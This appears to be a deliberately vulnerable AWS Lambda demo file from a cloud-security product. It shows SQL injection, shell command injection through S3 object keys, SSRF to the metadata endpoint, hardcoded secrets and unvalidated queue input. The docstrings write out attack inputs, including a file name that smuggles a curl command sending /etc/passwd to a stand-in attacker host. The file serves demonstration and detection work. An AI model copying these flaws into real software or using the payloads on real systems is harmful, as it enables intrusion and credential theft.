#!/usr/bin/env python3
# =============================================================================
# serverless/event_injection.py — TigerGate CNAPP: Serverless Security
# =============================================================================
# PURPOSE: Demonstrates how Lambda/serverless functions are vulnerable when
# they trust event data from external sources (API Gateway, SQS, S3, SNS)
# without validation. Event data injection can lead to SQLi, SSRFi, and RCE.
#
# SERVERLESS FINDINGS:
#   SLS-001: SQL injection via API Gateway event path parameter
#   SLS-002: OS command injection via S3 object key (file processing Lambda)
#   SLS-003: SSRF via SNS message body URL
#   SLS-004: No input validation on SQS message payload
#   SLS-005: Lambda env vars contain secrets (visible in AWS console)
#   SLS-006: Overpermissioned Lambda execution role (AdministratorAccess)
# =============================================================================

import json, os, subprocess, sqlite3

# ── SLS-005: Hardcoded secrets in Lambda environment variables ────────────────
# 🔴 SLS-005: These show up in AWS Console → Lambda → Configuration → Env vars
# Anyone with iam:GetFunctionConfiguration or lambda:GetFunction can read them
DB_HOST     = os.environ.get("DB_HOST", "prod-db.us-east-1.rds.amazonaws.com")
DB_PASSWORD = os.environ.get("DB_PASSWORD", "ProdDB@Secret2024!")   # 🔴 SLS-005!
API_KEY     = os.environ.get("STRIPE_KEY", "STRIPE_LIVE_EXAMPLE_TEST_KEY_NOT_REAL") # 🔴 SLS-005!
ADMIN_TOKEN = os.environ.get("ADMIN_TOKEN", "admin_EXAMPLE_lambda_token_not_real")  # 🔴 SLS-005!

def lambda_handler(event, context):
    """Main Lambda entry point — routes to different handlers by event source."""
    source = event.get('source', 'api-gateway')

    if source == 'api-gateway':
        return handle_api_event(event)
    elif source == 's3':
        return handle_s3_event(event)
    elif source == 'sns':
        return handle_sns_event(event)
    elif source == 'sqs':
        return handle_sqs_event(event)
    return {"statusCode": 400, "body": "Unknown source"}

# ── SLS-001: SQL Injection via API Gateway event ──────────────────────────────
def handle_api_event(event):
    """
    🔴 SLS-001: API Gateway passes path/query params in event dict.
    Lambda trusts them without validation → SQLi.
    Attack event: {"pathParameters": {"userId": "1; DROP TABLE users; --"}}
    """
    # Extract user input from API Gateway event (no validation!)
    user_id = event.get('pathParameters', {}).get('userId', '')

    conn = sqlite3.connect(':memory:')
    # 🔴 SLS-001: String concatenation SQL injection
    query = f"SELECT * FROM users WHERE id = {user_id}"  # Classic SQLi!
    try:
        cursor = conn.execute(query)
        return {"statusCode": 200, "body": json.dumps(cursor.fetchall())}
    except Exception as e:
        return {"statusCode": 500, "body": str(e)}

# ── SLS-002: OS Command Injection via S3 event key ───────────────────────────
def handle_s3_event(event):
    """
    🔴 SLS-002: Lambda triggered by S3 upload. S3 object key used in shell command.
    Attack: Upload file named: 'file.pdf; curl attacker.com/steal?d=$(cat /etc/passwd)'
    """
    record = event.get('Records', [{}])[0]
    bucket = record.get('s3', {}).get('bucket', {}).get('name', '')
    # 🔴 SLS-002: S3 object key (controlled by uploader!) used in shell command
    object_key = record.get('s3', {}).get('object', {}).get('key', '')

    # 🔴 SLS-002: command injection — attacker controls object_key!
    cmd = f"aws s3 cp s3://{bucket}/{object_key} /tmp/{object_key} && convert /tmp/{object_key} /tmp/output.jpg"
    result = subprocess.run(cmd, shell=True, capture_output=True)  # 🔴 SHELL=TRUE!
    return {"statusCode": 200, "body": result.stdout.decode()}

# ── SLS-003: SSRF via SNS message URL ────────────────────────────────────────
def handle_sns_event(event):
    """
    🔴 SLS-003: Lambda reads URL from SNS message and fetches it (webhook Lambda).
    Attack SNS payload: {"webhook_url": "http://169.254.169.254/latest/meta-data/"}
    """
    import urllib.request
    record = event.get('Records', [{}])[0]
    message = json.loads(record.get('Sns', {}).get('Message', '{}'))

    webhook_url = message.get('webhook_url', '')
    # 🔴 SLS-003: Lambda fetches attacker-controlled URL from SNS message (SSRF!)
    response = urllib.request.urlopen(webhook_url)  # Fetches IMDS or internal services!
    return {"statusCode": 200, "body": response.read().decode()}

# ── SLS-004: No validation on SQS event payload ──────────────────────────────
def handle_sqs_event(event):
    """
    🔴 SLS-004: SQS message body parsed and used without validation.
    Any SQS sender can inject arbitrary data into the Lambda processing pipeline.
    """
    records = event.get('Records', [])
    processed = []
    for record in records:
        body = json.loads(record.get('body', '{}'))
        # 🔴 SLS-004: No schema validation, no sanitization, no type checking
        user_email = body.get('email')      # Could be "'; DROP TABLE queue_log; --"
        amount     = body.get('amount')     # Could be negative, -9999999
        action     = body.get('action')     # Could be 'delete_all_users'
        # Lambda blindly processes whatever is in the message
        processed.append({"email": user_email, "amount": amount, "action": action})
    return {"statusCode": 200, "processed": processed}
